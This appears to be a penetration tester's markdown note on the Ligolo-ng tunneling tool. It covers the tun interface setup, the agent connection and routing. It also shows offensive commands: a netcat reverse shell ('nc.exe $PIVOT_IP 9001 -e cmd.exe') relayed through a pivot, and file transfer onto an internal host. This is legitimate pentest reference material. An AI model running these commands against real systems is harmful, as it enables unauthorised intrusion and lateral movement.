---
tags:
  - tool
  - tunneling
---
# Ligolo-ng

A _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS) - [ligolo-ng](https://github.com/nicocha30/ligolo-ng)

```bash
# Configure the network interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Cleanup the network interface (automatically performed on reboot)
sudo ip link delete ligolo
```

See [Youtube](https://www.youtube.com/watch?v=DM1B8S80EvQ)

## Capabilities

```bash
# Start agent on kali
~/compiled_binaries/ligolo/proxy -selfcert

# Connect to agent on target
.\agent.exe -connect $OUR_IP:11601 -retry -ignore-cert
```

### Establish tunnel

**In Logolo session:**

```bash
# Select session
session

# Check interface information
ifconfig
```

**In normal terminal:**

```bash
# Add routing information to global routing table
sudo ip route add $TARGET_CIDR dev ligolo

# Confirm routing information
ip r
```

**In Logolo Session:**

```bash
# Start the tunnel
start
```

### Forward Reverse Shell Connections

**In Logolo session:**

```bash
# Setup listener
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443

# Check listeners
listener_list
```

**In normal terminal:**

```bash
# On kali machine
rlwrap -crA nc -lvnp 9001

# On internal host
.\nc.exe $PIVOT_IP 9001 -e cmd.exe
```

### Upload Files

**In Logolo session:**

```bash
# Setup listener for uploading files with python simple http server
listener_add -addr 0.0.0.0:9002 --to 127.0.0.1:80
```

**In normal terminal:**

```bash
# On kali machine
python3 -m http.server 80

# On internal host
iwr -uri http://$PIVOT_IP:9002/example.txt -outfile example.txt
```
